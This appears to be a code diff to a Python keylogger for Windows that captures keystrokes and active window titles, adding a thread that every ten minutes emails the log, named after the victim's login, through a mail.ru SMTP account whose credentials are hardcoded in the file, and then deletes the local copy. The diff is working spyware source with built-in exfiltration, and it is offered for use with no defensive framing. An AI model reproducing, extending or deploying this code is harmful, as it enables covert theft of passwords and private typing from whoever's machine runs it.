@@ -1,4 +1,4 @@
-import pythoncom, pyHook, threading
+import pythoncom, pyHook, threading, os, time, shutil 
 #This allow us to capture de windows name where the key is pressed
 from win32gui import GetWindowText, GetForegroundWindow
 
@@ -9,8 +9,18 @@ auxWindow = None
 mainList = []
 #this list will be a copy of mainList when we set the signal to write in to the log file 
 auxList = []
-#path of the log file
+
+#path of the log file, be careful of choose a good place
 dirLog = 'log.txt'
+#path of the copy log file,in this case I will send a log file with the name of the user 
+dirCopy = 'log%s.txt' %os.getlogin()
+
+#email 
+user = 'systemclear3@mail.ru'
+pwd = 'megamind123'
+recipient = 'systemclear3@mail.ru'
+#seconds that email with log file will be send
+delay = 600
 
 #This is the core function, receives the keystroke event and we can do whatever we want with it
 #return true to pass the event to others handlers
@@ -77,7 +87,7 @@ def writer():
 	f.write('\n')
 	f.close()
 
-#function that filter and maps the keystrokes by it ascii code
+#Function that filter and maps the keystrokes by it ascii code
 def filter(ascii):
 	if ascii == 13:
 		return '\n'
@@ -96,6 +106,56 @@ def filter(ascii):
 	
 	return chr(ascii)
 
+#Function that send an email with the log file
+def sendMail():
+	import smtplib
+	from email import encoders
+	from email.mime.base import MIMEBase
+	from email.mime.multipart import MIMEMultipart
+    
+	while 1:
+		#check if the logfile have something
+		b = os.path.getsize(dirLog)
+		if b > 0 :	
+			shutil.copy(dirLog, dirCopy)
+			# Create the enclosing (outer) message
+			outer = MIMEMultipart()
+			outer['Subject'] = os.getlogin()
+			outer['To'] = recipient
+			outer['From'] = user
+			outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
+			try:
+				with open(dirCopy, 'rb') as fp:
+					msg = MIMEBase('application', "octet-stream")
+					msg.set_payload(fp.read())
+				encoders.encode_base64(msg)
+				msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(dirCopy))
+				outer.attach(msg)
+			except:
+				print("Unable to open one of the attachments. Error: ", sys.exc_info()[0])
+				pass
+
+			composed = outer.as_string()
+				
+			try:
+				with smtplib.SMTP('smtp.mail.ru', 587) as s:
+					s.ehlo()
+					s.starttls()
+					s.ehlo()
+					s.login(user, pwd)
+					s.sendmail(user, recipient, composed)
+					s.close()		
+				print("Email sent!")
+				os.remove(dirLog)
+				f = open(dirLog, 'a')
+				f.close()
+				
+			except:
+				print("Unable to send the email. Error: ", sys.exc_info()[0])
+				pass
+			os.remove(dirCopy)
+		time.sleep(delay)
+
 '''We will use threads for various things'''
 #This is the thread that handle the main function
 class mainThread (threading.Thread):
@@ -107,6 +167,7 @@ class mainThread (threading.Thread):
 	def run(self):
 		print ("Starting " + self.name)
 		mainFunction()
+		
 #This is the thread that waits for the signal to write in the log file
 class waiterThread (threading.Thread):
 	def __init__(self, threadID, name, counter):
@@ -117,13 +178,27 @@ class waiterThread (threading.Thread):
 	def run(self):
 		print ("Starting " + self.name)
 		waiter()
+		
+#This thread handle the email stuff
+class mailThread (threading.Thread):
+	def __init__(self, threadID, name, counter):
+		threading.Thread.__init__(self)
+		self.threadID = threadID
+		self.name = name
+		self.counter = counter
+	def run(self):
+		print ("Starting " + self.name)
+		sendMail()
 
 e = threading.Event()	
 		
 main = mainThread(1, "mainThread", 1)
 wait = waiterThread(2, "waiterThread", 2)
+mail = mailThread(3, "mailThread", 3)
 
 wait.start()
 main.start()
+time.sleep(3)
+mail.start()
 
 
